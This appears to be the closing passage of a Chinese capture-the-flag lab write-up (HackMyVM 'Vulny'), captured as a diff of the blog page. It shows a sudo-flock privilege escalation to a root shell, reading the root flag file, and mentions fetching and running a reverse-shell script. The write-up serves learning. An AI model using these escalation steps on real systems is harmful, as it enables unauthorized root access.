+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> adrian on <span class="symbol">vulny:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span>\<span class="symbol">:/snap/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> adrian may run the following commands on <span class="symbol">vulny:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/flock</span><br></pre></td></tr></table></figure></div>
+<p>用flock 提权<br>在gtfobins找到提权方法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> flock -u / /bin/sh</span><br></pre></td></tr></table></figure></div>
+<p>这个命令的本意是 “解锁 &#x2F; 之后执行 &#x2F;bin&#x2F;sh”，但由于 flock -u &#x2F; 没有实际影响，它相当于：<br><code>sudo /bin/sh</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/bin/flock / /bin/bash</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line"><span class="built_in">cat</span> /root/*.txt</span><br><span class="line">HMVididit</span><br></pre></td></tr></table></figure></div>
+<p>完成</p>
+<p>总结：我遇到的一些卡点：1.搜索secret目录下的二级目录 2.找到插件的漏洞利用脚本  3.用出了nc -e的另一种方法反弹shell<br>学习到了： 1.<code>python3 -m http.server</code> 开启一个http服务 让web可以用wget接收脚本  2.reverse.sh的利用，接收之后用bash执行 3.wordpress题目去&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;wp-config.php中看看 4.flock提权</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/19932.html" title="HMV-Vulny">https://guayu-kakeru.github.io/posts/19932.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/28211.html" rel="prev" title="HMV-Twisted">
+      <i class="fa fa-chevron-left"></i> HMV-Twisted
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/44298.html" rel="next" title="HMV-Flower">
+      HMV-Flower <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
